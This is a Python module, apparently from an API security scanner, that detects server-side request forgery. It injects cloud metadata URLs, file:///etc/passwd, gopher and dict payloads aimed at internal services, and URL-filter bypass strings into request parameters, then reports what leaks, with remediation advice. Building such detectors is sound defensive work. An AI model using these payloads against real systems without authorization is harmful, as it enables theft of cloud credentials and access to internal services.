"""
ssrf_detector.py
----------------
Detects Server-Side Request Forgery (SSRF) vulnerabilities.

Five sub-checks:
  1. Basic SSRF       – inject metadata URL into url/uri params, see if response leaks data
  2. Blind SSRF       – inject a callback URL (Burp Collaborator / ngrok) — skipped if no
                        --callback provided
  3. SSRF via Redirect– inject a URL that redirects to the metadata endpoint
  4. Protocol Smuggling– try file://, dict://, gopher:// schemes
  5. Partial SSRF     – server fetches external URLs but filters partially (bypass via @, [])

All findings include the payload used and a body preview as forensic evidence.
"""

import re
import time
import requests
from urllib.parse import quote as _urlquote

from auth import AnonymousAuthHandler, AuthHandler, CompositeAuthHandler, build_auth_handler
from request_utils import RequestBudget


class SSRFDetector:

    # Cloud metadata endpoints
    METADATA_URLS = [
        'http://169.254.169.254/latest/meta-data/',          # AWS IMDSv1
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://169.254.169.254/latest/user-data/',
        'http://metadata.google.internal/computeMetadata/v1/',   # GCP
        'http://169.254.169.254/computeMetadata/v1/',
        'http://169.254.169.254/metadata/instance',          # Azure
    ]

    # Patterns that indicate a metadata response was returned
    METADATA_PATTERNS = [
        r'AKIA[0-9A-Z]{16}',           # AWS access key
        r'ami-[0-9a-f]{8,17}',         # AWS AMI ID
        r'ip-\d+-\d+-\d+-\d+\.ec2\.internal',  # AWS internal hostname
        r'"accessKeyId"\s*:',           # AWS creds JSON key
        r'\\?"computeMetadata\\?"\s*:',  # GCP metadata JSON key
        r'x-ms-azure',                  # Azure marker
        r'"instanceId"\s*:',            # Generic cloud
    ]

    # Protocol smuggling payloads
    PROTOCOL_PAYLOADS = [
        'file:///etc/passwd',
        'dict://localhost:11211/',      # Memcache
        'gopher://localhost:6379/_',    # Redis
        'ftp://localhost:21/',
    ]

    def __init__(self, callback_url: str = None, delay: float = 0.0,
                 verify: bool = True, proxy: str = None, verbose: bool = False,
                 active: bool = False, budget: RequestBudget = None):
        """
        callback_url : Burp Collaborator / ngrok URL for blind SSRF.
                       If None, blind SSRF check is skipped entirely.
        delay        : seconds to sleep between requests (rate limiting).
        verify       : set False to skip TLS certificate verification.
        proxy        : HTTP proxy URL e.g. 'http://127.0.0.1:8080'.
        verbose      : print every request URL + payload to stdout.
        """
        self.callback_url = callback_url   # None = skip blind SSRF
        self.delay        = delay
        self.verify       = verify
        self.proxies      = {'http': proxy, 'https': proxy} if proxy else None
        self.verbose      = verbose
        self.active       = active
        self.budget       = budget
        self._auth_scheme: object = None
        self._auth_handlers: dict[
            tuple, AuthHandler | CompositeAuthHandler | AnonymousAuthHandler
        ] = {}
        self._body_params: list = []
        self._method: str | None = None

    # ------------------------------------------------------------------ #
    #  Entry point                                                         #
    # ------------------------------------------------------------------ #

    def test_endpoint(self, method: str, full_url: str, url_params: list,
                      user: dict | str, auth_scheme: dict = None,
                      all_params: list = None) -> list:
        """
        Run all SSRF checks on a single endpoint.

        full_url   : fully-resolved URL (base_url + path with IDs substituted)
        url_params : list of param dicts that look like URL inputs
        token      : Bearer token string

        Returns list of finding dicts.
        """
        if method not in ('GET', 'HEAD', 'OPTIONS') and not self.active:
            return []

        findings = []
        self._auth_scheme = auth_scheme
        self._method = method
        self._body_params = [
            param for param in (all_params or url_params)
            if param.get('in') in ('body', 'form')
        ]

        for param in url_params:
            findings += self._basic_ssrf(method, full_url, param, user)
            findings += self._blind_ssrf(method, full_url, param, user)
            findings += self._redirect_ssrf(method, full_url, param, user)
            findings += self._protocol_smuggling(method, full_url, param, user)
            findings += self._partial_ssrf(method, full_url, param, user)

        return findings

    # ------------------------------------------------------------------ #
    #  Sub-checks                                                          #
    # ------------------------------------------------------------------ #

    def _basic_ssrf(self, method, url, param, token) -> list:
        """Inject metadata URLs; check if response body contains metadata patterns."""
        findings = []
        for payload in self.METADATA_URLS:
            if self.verbose:
                print(f'      [SSRF] Basic  param={param["name"]}  payload={payload}')
            resp = self._request(method, url, token, param['name'], payload, param['in'], param.get('path'))
            if resp and self._contains_metadata(resp.text, payload):
                findings.append(self._make_finding(
                    check='Basic SSRF',
                    url=url,
                    param=param['name'],
                    payload=payload,
                    status=resp.status_code,
                    body_preview=resp.text[:400],
                    severity='CRITICAL',
                    description=(
                        'The server fetched a cloud metadata endpoint and returned its contents. '
                        'This allows an attacker to steal IAM credentials and take over the cloud account.'
                    ),
                ))
                break   # one finding per param is enough
        return findings

    def _blind_ssrf(self, method, url, param, token) -> list:
        """
        Inject a callback URL and check if the server reflects it in the response.

        True blind SSRF confirmation requires an out-of-band listener (Burp
        Collaborator / ngrok) — the scanner cannot observe DNS/HTTP hits on its
        own. This check is a best-effort in-band signal: if the server echoes
        the callback URL in its response body, the request was likely processed.

        Skipped entirely when no --callback URL was provided.
        """
        if not self.callback_url:
            return []   # no callback configured — skip rather than fire useless requests

        if self.verbose:
            print(f'      [SSRF] Blind  param={param["name"]}  callback={self.callback_url}')

        resp = self._request(method, url, token, param['name'], self.callback_url, param['in'], param.get('path'))
        # Only flag if the callback URL is reflected in the response body.
        # A plain 200 response (without the URL in the body) is not evidence of
        # SSRF — it just means the server didn't reject the input, which is normal
        # for many endpoints and would cause high false-positive rates.
        if resp and self.callback_url in resp.text:
            return [self._make_finding(
                check='Blind SSRF (unconfirmed — in-band signal only)',
                url=url,
                param=param['name'],
                payload=self.callback_url,
                status=resp.status_code,
                body_preview=resp.text[:200],
                severity='LOW',
                description=(
                    f'Server reflected the callback URL "{self.callback_url}" in its response body. '
                    'This is a weak in-band signal only — it does NOT confirm that the server made '
                    'an outbound request to the callback URL. '
                    'REQUIRED: Check your out-of-band listener (Burp Collaborator / ngrok / interactsh) '
                    'for an actual DNS or HTTP hit. Only escalate severity if OOB hit confirmed.'
                ),
            )]
        return []

    def _redirect_ssrf(self, method, url, param, token) -> list:
        """
        Inject a URL that *redirects* to a metadata endpoint.
        Some filters block direct metadata IPs but follow open redirects.
        """
        redirect_payloads = [
            'http://169.254.169.254.nip.io/latest/meta-data/',   # DNS rebinding-style
            'http://[::ffff:169.254.169.254]/latest/meta-data/',  # IPv6 mapped
            'http://0.0.0.0/latest/meta-data/',                   # SSRF bypass
            'http://localhost@169.254.169.254/latest/meta-data/', # @ trick
        ]
        findings = []
        for payload in redirect_payloads:
            if self.verbose:
                print(f'      [SSRF] Redirect  param={param["name"]}  payload={payload}')
            resp = self._request(method, url, token, param['name'], payload, param['in'], param.get('path'))
            if resp and self._contains_metadata(resp.text, payload):
                findings.append(self._make_finding(
                    check='SSRF via Redirect / Filter Bypass',
                    url=url,
                    param=param['name'],
                    payload=payload,
                    status=resp.status_code,
                    body_preview=resp.text[:400],
                    severity='CRITICAL',
                    description='URL-filter bypass allowed SSRF to the metadata endpoint via a non-standard representation.',
                ))
                break
        return findings

    def _protocol_smuggling(self, method, url, param, token) -> list:
        """Try non-HTTP schemes to reach internal services."""
        findings = []
        for payload in self.PROTOCOL_PAYLOADS:
            if self.verbose:
                print(f'      [SSRF] Protocol  param={param["name"]}  payload={payload}')
            resp = self._request(method, url, token, param['name'], payload, param['in'], param.get('path'))
            if resp and resp.status_code == 200 and resp.content:
                evidence_text = self._without_reflection(resp.text, payload)
                if self._contains_protocol_evidence(payload, evidence_text):
                    findings.append(self._make_finding(
                        check='Protocol Smuggling SSRF',
                        url=url,
                        param=param['name'],
                        payload=payload,
                        status=resp.status_code,
                        body_preview=resp.text[:400],
                        severity='CRITICAL',
                        description=f'Non-HTTP scheme "{payload.split("://")[0]}" was not blocked. Server read an internal file or service.',
                    ))
        return findings

    @staticmethod
    def _contains_protocol_evidence(payload: str, text: str) -> bool:
        """Match protocol-specific response signatures, never generic hostnames."""
        scheme = payload.split('://', 1)[0].lower()
        patterns = {
            'file': r'(^|\n)root:[^:\n]*:\d+:\d+:',
            'dict': r'(^|\n)(STAT|VALUE|END)(\s|$)',
            'gopher': r'(^|\n)[+\-$](PONG|ERR|OK|\d+|\d*\r?$)',
            'ftp': r'(^|\n)220[ -][^\n]+',
        }
        pattern = patterns.get(scheme)
        return bool(pattern and re.search(pattern, text, re.IGNORECASE | re.MULTILINE))

    def _partial_ssrf(self, method, url, param, token) -> list:
        """
        Partial SSRF: server allows fetching some URLs but has a filter.
        We probe edge cases like whitelisted-domain@evil.com or DNS rebinding.
        """
        findings = []
        bypass_payloads = [
            'http://169.254.169.254@trusted.com/latest/meta-data/',  # URL authority bypass
            'http://trusted.com#@169.254.169.254/latest/meta-data/', # fragment trick
            'http://169.254.169.254%09/latest/meta-data/',           # tab character encoding
        ]
        for payload in bypass_payloads:
            if self.verbose:
                print(f'      [SSRF] Partial  param={param["name"]}  payload={payload}')
            resp = self._request(method, url, token, param['name'], payload, param['in'], param.get('path'))
            if resp and self._contains_metadata(resp.text, payload):
                findings.append(self._make_finding(
                    check='Partial SSRF (Filter Bypass)',
                    url=url,
                    param=param['name'],
                    payload=payload,
                    status=resp.status_code,
                    body_preview=resp.text[:400],
                    severity='HIGH',
                    description='SSRF filter was bypassed using URL encoding / authority tricks.',
                ))
                break
        return findings

    # ------------------------------------------------------------------ #
    #  Helpers                                                             #
    # ------------------------------------------------------------------ #

    def _request(self, method, url, user, param_name, payload, param_in,
                 param_path=None) -> requests.Response | None:
        """Send a single SSRF probe request with optional rate-limit retry (429 backoff)."""
        identity = user.get('name', id(user)) if isinstance(user, dict) else user
        auth_key = (identity, repr(self._auth_scheme))
        auth = self._auth_handlers.setdefault(
            auth_key, build_auth_handler(user, self._auth_scheme)
        )
        for attempt in range(3):
            try:
                if self.budget and not self.budget.consume():
                    return None
                headers = {}
                request_kwargs: dict = {}
                if param_in == 'query':
                    resolved_url = re.sub(r'\{[^}]+\}', '1', url)
                    sep = '&' if '?' in url else '?'
                    # URL-encode the payload so characters like #, &, = inside it
                    # are treated as literal data, not URL syntax.  Without this,
                    # a '#' in a bypass payload (e.g. http://trusted.com#@evil.com)
                    # is interpreted as a fragment separator and everything after it
                    # is silently stripped before the request is sent.
                    #
                    # Guard against double-encoding: if the payload already contains
                    # percent-encoded sequences (e.g. %09, %2e), encoding again
                    # would turn '%09' into '%2509', which is a different byte and
                    # causes the bypass to silently fail (false negative).
                    if re.search(r'%[0-9A-Fa-f]{2}', payload):
                        encoded_payload = payload          # already encoded — pass through
                    else:
                        encoded_payload = _urlquote(payload, safe='')
                    resp = requests.request(
                        method, f'{resolved_url}{sep}{param_name}={encoded_payload}',
                        timeout=8, allow_redirects=True,
                        verify=self.verify, proxies=self.proxies,
                        **auth.apply(request_kwargs),
                    )
                elif param_in == 'path':
                    encoded_payload = _urlquote(payload, safe='%')
                    marker = '{' + param_name + '}'
                    injected_url = url.replace(marker, encoded_payload)
                    injected_url = re.sub(r'\{[^}]+\}', '1', injected_url)
                    resp = requests.request(
                        method, injected_url, timeout=8, allow_redirects=True,
                        verify=self.verify, proxies=self.proxies,
                        **auth.apply(request_kwargs),
                    )
                elif param_in == 'header':
                    # Inject payload as a custom request header.
                    # e.g. X-Target-URL: http://169.254.169.254/...
                    headers[param_name] = payload
                    request_kwargs['headers'] = headers
                    resp = requests.request(
                        method, re.sub(r'\{[^}]+\}', '1', url), timeout=8,
                        allow_redirects=True,
                        verify=self.verify, proxies=self.proxies,
                        **auth.apply(request_kwargs),
                    )
                elif param_in == 'cookie':
                    # Inject payload as a cookie value.
                    # Append to existing Cookie header if already present.
                    existing = headers.get('Cookie', '')
                    cookie_str = f'{param_name}={payload}'
                    headers['Cookie'] = f'{existing}; {cookie_str}' if existing else cookie_str
                    request_kwargs['headers'] = headers
                    resp = requests.request(
                        method, re.sub(r'\{[^}]+\}', '1', url), timeout=8,
                        allow_redirects=True,
                        verify=self.verify, proxies=self.proxies,
                        **auth.apply(request_kwargs),
                    )
                else:   # body / form param
                    body = self._base_body()
                    self._set_nested(body, param_path or param_name.split('.'), payload)
                    if param_in == 'form':
                        request_kwargs['data'] = body
                    else:
                        request_kwargs['json'] = body
                    resp = requests.request(
                        method, re.sub(r'\{[^}]+\}', '1', url), timeout=8,
                        verify=self.verify, proxies=self.proxies,
                        **auth.apply(request_kwargs),
                    )
                if resp.status_code == 429:
                    wait = (2 ** attempt) * max(self.delay, 1.0)
                    if self.verbose:
                        print(f'      [SSRF] 429 rate-limited — retrying in {wait:.1f}s')
                    time.sleep(wait)
                    continue
                if resp.status_code >= 500:
                    wait = (2 ** attempt) * max(self.delay, 0.5)
                    if self.verbose:
                        print(f'      [SSRF] {resp.status_code} server error — retrying in {wait:.1f}s')
                    time.sleep(wait)
                    continue
                if self.delay > 0:
                    time.sleep(self.delay)
                return resp
            except requests.RequestException:
                return None
        return None   # all retries exhausted

    @staticmethod
    def _set_nested(payload: dict, path: list, value):
        node = payload
        for part in path[:-1]:
            node = node.setdefault(part, {})
        node[path[-1]] = value

    def _base_body(self) -> dict:
        body: dict = {}
        for param in self._body_params:
            if not param.get('required'):
                continue
            schema = param.get('schema') or {}
            if 'example' in schema:
                value = schema['example']
            elif 'default' in schema:
                value = schema['default']
            elif schema.get('enum'):
                value = schema['enum'][0]
            else:
                schema_type = str(schema.get('type') or '')
                value = {
                    'integer': 7,
                    'number': 0.01,
                    'boolean': False,
                    'array': [],
                    'object': {},
                }.get(schema_type, 'vigilant-test')
            self._set_nested(body, param.get('path') or param['name'].split('.'), value)
        return body

    @staticmethod
    def _without_reflection(text: str, payload: str | None = None) -> str:
        """Remove the injected value so simple reflection is not treated as proof."""
        if not payload:
            return text
        variants = {
            payload,
            payload.replace('/', '\\/'),
            _urlquote(payload, safe=''),
            _urlquote(payload, safe='%'),
        }
        for variant in variants:
            text = text.replace(variant, '')
        return text

    def _contains_metadata(self, text: str, payload: str | None = None) -> bool:
        """Return True if the response body matches any known cloud metadata pattern."""
        text = self._without_reflection(text, payload)
        for pattern in self.METADATA_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False

    def _make_finding(self, check, url, param, payload, status, body_preview, severity, description) -> dict:
        return {
            'type':      'SSRF',
            'method':    self._method,
            'check':     check,
            'vulnerable': True,
            'severity':   severity,
            'endpoint':   url,
            'parameter':  param,
            'evidence': {
                'payload':      payload,
                'status_code':  status,
                'body_preview': body_preview,
            },
            'description': description,
            'remediation': (
                'Implement an allowlist of permitted destination URLs/IPs. '
                'Block requests to RFC 1918 private ranges (10.x, 172.16-31.x, 192.168.x) '
                'and 169.254.169.254. Disable HTTP redirects in server-side fetch calls. '
                'Block non-HTTP(S) schemes at the application layer.'
            ),
        }
